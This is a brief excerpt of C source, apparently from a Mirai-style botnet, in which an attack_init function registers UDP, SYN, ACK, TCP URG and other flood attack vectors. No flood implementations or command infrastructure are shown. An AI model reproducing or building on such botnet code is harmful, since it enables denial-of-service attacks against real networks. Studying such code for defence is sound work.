...
BOOL attack_init(void)
{
    ...
    add_attack(ATK_VEC_UDP, (ATTACK_FUNC)attack_udp);
    add_attack(ATK_VEC_SYN, (ATTACK_FUNC)attack_syn);
    add_attack(ATK_VEC_ACK, (ATTACK_FUNC)attack_ack);
    add_attack(ATK_VEC_TCPURG, (ATTACK_FUNC)attack_tcpurg);
    add_attack(ATK_VEC_VOLTUDP, (ATTACK_FUNC)attack_voltudp);
    add_attack(ATK_VEC_TCPALL, (ATTACK_FUNC)attack_tcpall);
    add_attack(ATK_VEC_UDPGAME, (ATTACK_FUNC)attack_method_udpplain);
...
#ifdef DEBUG
    printf("dbg: killing all running attacks.\n");
#endif
